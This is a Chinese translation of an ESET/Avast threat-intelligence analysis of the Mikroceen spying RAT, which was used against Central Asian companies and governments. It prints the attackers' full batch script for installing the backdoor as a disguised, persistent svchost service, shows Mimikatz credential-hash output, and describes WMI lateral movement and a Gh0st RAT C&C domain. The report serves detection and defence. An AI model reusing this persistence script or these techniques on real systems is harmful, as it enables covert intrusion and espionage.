**原文：[Mikroceen: Spying backdoor leveraged in high‑profile networks in Central
Asia](https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ "Mikroceen: Spying backdoor leveraged in
high‑profile networks in Central Asia")  
译者：知道创宇404实验室翻译组**

在这篇与Avast研究员的联合博文中，我们提供了一项技术分析，介绍一种不断发展的RAT技术，自2017年末以来，它被用于各种针对公共和私人目标的间谍活动中。我们观察到该RAT的多起攻击实例，而且都发生在中亚地区。目标对象包括电信和天然气行业中的几家重要公司以及政府机构。

此外，我们把最新的间谍活动与之前发表的三篇报道联系起来：卡巴斯基(Kaspersky)对针对俄罗斯军事人员的Microcin的[报道](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07170759/Microcin_Technical_4PDF_eng_final_s.pdf
"报道")、Palo Alto
Networks对针对白俄罗斯政府的BYEBY的[报道](https://unit42.paloaltonetworks.com/unit42-threat-actors-target-government-belarus-using-cmstar-trojan
"报道")，以及Checkpoint对针对蒙古公共部门的Vicious
Panda的[报道](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign
"报道")。此外，我们还讨论了通常是攻击者工具集中一部分的其他恶意软件。我们选择了“Mikroceen”这个名字来涵盖RAT的所有实例，以感谢卡巴斯基关于这个恶意软件家族的最初报告。这里的拼写错误是我们有意的，为了区别已有的微生物概念，同时也保持发音一致。

### 集群

首先，让我们讨论一下Mikroceen的集群，这是一个简单的RAT，并且我们会说明为什么我们认为卡巴斯基、Palo Alto
Networks和Checkpoint的报告(其中提到的其它恶意工具)写的是同一特定恶意软件家族。图1提供了用于配置数据的解密循环的比较，这些配置数据包括C&C域名、与每个样本相关联的名称和密码。循环实际上是相同的，它是在一行三个副本中实现的。Checkpoint还讨论了BYEBY和Vicious
Panda之间数据部分的HTTP头的相似性，以及base64解码为WORKIN的共享日志消息V09SS0lO。编码的字符串也存在于Microcin中。

![
](https://images.seebug.org/content/images/2020/05/28539728-cad2-40f0-9d30-ff1d14399ca7.png-w331s)
图1 用于解密内部数据的部分代码；导出的DLL名称位于底部

在下面的小节中，我们还将RAT功能的命令语法和执行过程中记录的RAT与以前实例的典型错误消息进行了比较。为了支持证据，攻击者首选的基础设施提供商和最典型的恶意软件同时出现在受攻击的网络上。所有这些线索应该会让人强烈相信，这是同一个恶意软件家族。

### 时间轴与受害者

图2描述了威胁如何被及时跟踪的演变过程。如前所述，中亚地区与俄罗斯、白俄罗斯和蒙古一样，都是遭受Mikroceen入侵的地区。这些受害者不是台式机用户，而是企业网络中的终端用户，企业网络的安全级别更高。

![
](https://images.seebug.org/content/images/2020/05/1305adfa-83ec-46f6-8f57-7423d4355753.png-w331s)
图2 与Mikroceen有关的事件时间表

![
](https://images.seebug.org/content/images/2020/05/7c8d484e-d001-4441-9cc1-0e5bcf28afed.png-w331s)
图3 最近在中亚的攻击活动被先前报道过的包围

### 攻击者的武器库

让我们来描述一下攻击者在中亚间谍活动中使用的工具，不过我们无法发现他们是如何进入被入侵的网络的。

#### RAT(客户端后门)

一旦入侵者在受害机器上建立了立足点，图4中的代码将用于在系统上安装RAT。注意参数`start= auto`，该参数可确定重新启动后恶意软件的持久性。

    
    
    @echo off
    sc stop PCAudit
    sc delete PCAudit
    sc create PCAudit binpath= "C:\WINDOWS\syswow64\svchost.exe -k netsvcs" type= share start= auto displayname= "Windows Upload Manager"
    sc description PCAudit "Windows Help Service is a microsoft Windows component for System(Important). If this service is stopped, users will be unable to get useful information"
    sc failure PCAudit reset= 0 actions= restart/0
    reg add HKLM\SYSTEM\CurrentControlSet\Services\PCAudit\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\Syswow64\pcaudit.dll
    reg add HKLM\SYSTEM\CurrentControlSet\Services\PCAudit\Parameters /v ServiceMain /t REG_SZ /d NtHelpServiceMain
    reg add HKLM\SYSTEM\CurrentControlSet\Services\PCAudit\Parameters /v ServiceDllUnloadOnStop /t REG_DWORD /d 1
    sc start PCAudit
    del %0

图4 安装批处理代码

正如我们前面提到的，每个bot都带有配置数据：C&C、客户端名称和客户端密码。bot的名称出现在服务器端接口中。不同寻常的是，操作员需要通过输入客户端密码进行身份验证，以控制客户端。我们只能推测其目的，但它可以作为防止僵尸网络接管的保护措施，以防竞争对手或执法机构接管它们的基础设施。因此，我们看到在客户端-服务器连接的安全性上做了一些工作。此外，客户端可以直接连接到C&C服务器或通过代理路由流量，这可能很有用——尤其是在公司网络中。连接通过证书进一步得到保护，这是Mikroceen区别于我们之前看到的大量后门的一个特性。

Mikroceen使用了与之前Palo Alto
Networks描述的关于BYEBY相同的基本特性。命令的语法非常具体，因为每个命令都被截断为6个字母，然后用base64编码。这导致代码中出现了一个8个字母的无法理解的单词。虽然在以前的情况下，编码很简单，但在中亚的间谍活动中，增加了额外的未知加密层。在这种情况下，8个字母的单词与命令之间的连接是在代码级别上通过协议完成的。

![
](https://images.seebug.org/content/images/2020/05/390743fe-15d8-45cd-8bd9-1dd8a8d00d10.png-w331s)

表1 RAT各种实例的命令语法

在执行期间，客户端将调试消息记录在一个临时文件中。这在不同的Mikroceen实例中是不同的。表2提供了这些消息在不同情况下的比较，并提供了链接Mikroceen实例的其它证据。

![
](https://images.seebug.org/content/images/2020/05/7a58783e-1061-4eaa-a1e7-9ed3aed559e0.png-w331s)
表2 在临时文件中记录消息

#### 同时发生的恶意软件

以前的报告总是提到攻击中使用的大量工具。在我们的例子中，情况是一样的——不仅是Mikroceen，还有其他恶意软件。以下是我们在受感染网络中观察到的三个最重要的工具。

##### 通过Mimikatz横向移动

攻击者使用了他们的Mimikatz，通过一个两级机制实现：第一阶段是通常称为installer.exe或Yokel64的删除程序，第二阶段用指示性外部DLL名称mktz64.dll删除了主要payload。虽然Mikroceen从来没有附带调试信息，但是在这里我们可以看到字符串`E:\2018_\MimHash\mimikatz\Bin\mktzx64.pdb`

![
](https://images.seebug.org/content/images/2020/05/80a38e1e-46ff-49d6-934d-3dd41fb3b86a.png-w331s)
Mimikatz payload中的PDB字符串

Mimikatz是一个由法国安全研究员Benjamin
Delpy自2007年开始开发的开源项目。它是一个强大的工具，可以绕过各种Windows身份验证方案，主要是通过从Windows本地安全帐户数据库转储凭据数据。它主要被It安全领域的red团队使用，但也被滥用于其他领域，如Lazarus
Group、Telebots、Okrum等。在测试虚拟环境中运行后，其输出为（逗号前的空格不正确）:

    
    
    #1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DDC971889.
    #2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DDC971889.

##### 通过Mimikatz横向移动

攻击者使用另一种工具在宿主网络中传播。这一次，他们利用了Windows管理工具(WMI)。所有相关数据都需要作为文件的名称，因为在执行期间，它需要`@@<ComputerName>，<UserName>，<Password>,.exe`。在第一步中，将建立到远程计算机的控制台，其中连接由`<ComputerName>`标识，并通过`(<UserName>，<Password>)`进行身份验证。然后，将代理安全性设置为严格级别，这意味着对每个远程过程调用的参数进行加密，并且允许服务器访问本地资源。然后再次使用WMI来检索Win32_Process类，这个类又用来创建具有给定参数的进程。当所有工作完成后，工具就会自动终止。

##### Gh0st RAT

这只臭名昭著的旧RAT是在2008年左右被创造出来的。在这个例子中，在被破坏的系统上它被发现为rastls.dll，而导出的DLL名称通常是svchost.dll。它尝试连接到https://yuemt.zzux[。]com:443，该地址解析为中国的一个IP地址。这是一个例外，因为该服务器不属于Mikroceen使用的任何C&C提供程序。在我们看来，使用这个额外的后门似乎是多余的，它的容量完全由Mikroceen自己提供。

要识别这个后门，可以观察二进制文件中的字符串Gh0st。字符串uwqixgze}用作C&C域的占位符。

![
](https://images.seebug.org/content/images/2020/05/0bf706dc-7bc6-4347-8fb1-8b1c48c5c96c.png-w331s)
图6 Gh0st RAT恶意软件

##### C＆C面板（服务器端接口）

之前的报告已经提到攻击者的操作安全性很差(卡巴斯基和Checkpoint观察到了他们打开的目录)，幕后的行动者继续泄露工具，而受害者一方不一定会利用这些工具。我们拿到了老版的RAT控制面板。在图7的下部有一个图形界面，通过这个界面可以控制所有bot。它非常简约，这可能是由于2017年的老版本，把它与超过10年以上的Gh0st
RAT面板进行比较的话。从视觉上或功能上看，都没有太大的改进，因此SSL连接的引入似乎是项目之间的主要变化(图中“CN
Name”的文本框)。僵尸网络的运营商似乎是Vultr services(一家Choopa
LLC的子公司)的内容客户，因为他们的运营基础设施主要托管在那里，这一点也在Checkpoint在Vicious
Panda恶意活动中观察到了。这是一家防弹供应商，早在2015年思科的研究人员就对其有所记录。

![
](https://images.seebug.org/content/images/2020/05/58ac6914-f37f-459e-98b9-2ecd9a9955eb.png-w331s)

![
](https://images.seebug.org/content/images/2020/05/9f5e6510-1c9c-4ed9-877c-4af175fc3da3.png-w331s)

图7 用于控制bot的界面：Gh0st RAT（2008）与Mikroceen的界面（2017）

### 结论

我们已经介绍了一个出于间谍目的开发的客户端-服务器模型的自定义实现的分析。恶意软件开发者花了很大的精力来确保与受害者和运营商之间的连接的安全性和强大性。此外，他们拥有更大的攻击工具集，并且他们的项目在不断地开发中，大多数都是作为混淆的形式可见。

### IoCs

这是本文中描述样本的哈希值。从攻击中收集到的其他IoC可以在ESET的[GitHub](https://github.com/eset/malware-ioc/tree/master/mikroceen/
"GitHub")或Avast的[GitHub](https://github.com/avast/ioc "GitHub")上找到。

![
](https://images.seebug.org/content/images/2020/05/7c14a093-01d7-4336-9e45-0ba017f0b90f.png-w331s)

### References

  * Vasily Berdnikov, Dmitry Karasovsky, Alexey Shulmin: “[Microcin malware](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07170759/Microcin_Technical_4PDF_eng_final_s.pdf "Microcin malware")”, Kaspersky Labs 2017-9-25
  * Josh Grunzweig, Robert Falcone: [“Threat Actors Target Government of Belarus Using CMSTAR Trojan](https://unit42.paloaltonetworks.com/unit42-threat-actors-target-government-belarus-using-cmstar-trojan/ "“Threat Actors Target Government of Belarus Using CMSTAR Trojan")”, September 2017
  * Checkpoint Research: “[Vicious Panda: The COVID Campaign](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/ "Vicious Panda: The COVID Campaign")”, 2020-03-12
  * SecDev Group & Citizenlab, “[Tracking GhostNet: Investigating a Cyber Espionage Network](https://citizenlab.ca/2009/03/tracking-ghostnet-investigating-a-cyber-espionage-network/ "Tracking GhostNet: Investigating a Cyber Espionage Network")”, March 2009,
  * Dhia Mahjoub, Jeremiah O’Connor, Thibault Reuille, Thomas Mathew: “[Phishing, Spiking, and Bad Hosting](https://umbrella.cisco.com/blog/2015/09/14/phishing-spiking-and-bad-hosting/ "Phishing, Spiking, and Bad Hosting")”, Cisco Umbrella Blog, 2015-09-14
  * “[Mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz "Mimikatz: A little tool to play with Windows security")”
  * Peter Kálnai, Anton Cherepanov. “[Lazarus KillDisks Central American casino](https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/ "Lazarus KillDisks Central American casino")”, WeLiveSecurity.com, April 2018
  * Anton Cherepanov, Robert Lipovský: “[New TeleBots backdoor: First evidence linking Industroyer to NotPetya](https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/ "New TeleBots backdoor: First evidence linking Industroyer to NotPetya")”, WeLiveSecurity.com, October 2018
  * Zuzana Hromcová: “[Okrum: Ke3chang group targets diplomatic missions](https://www.welivesecurity.com/2019/07/18/okrum-ke3chang-targets-diplomatic-missions/ "Okrum: Ke3chang group targets diplomatic missions")”, WeLiveSecurity.com, July 2019
  * Avast Threat Intelligence, [GitHub repository](https://github.com/avast/ioc "GitHub repository")
  * ESET Threat Intelligence, [GitHub repository](https://github.com/eset/malware-ioc "GitHub repository")

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1206/>

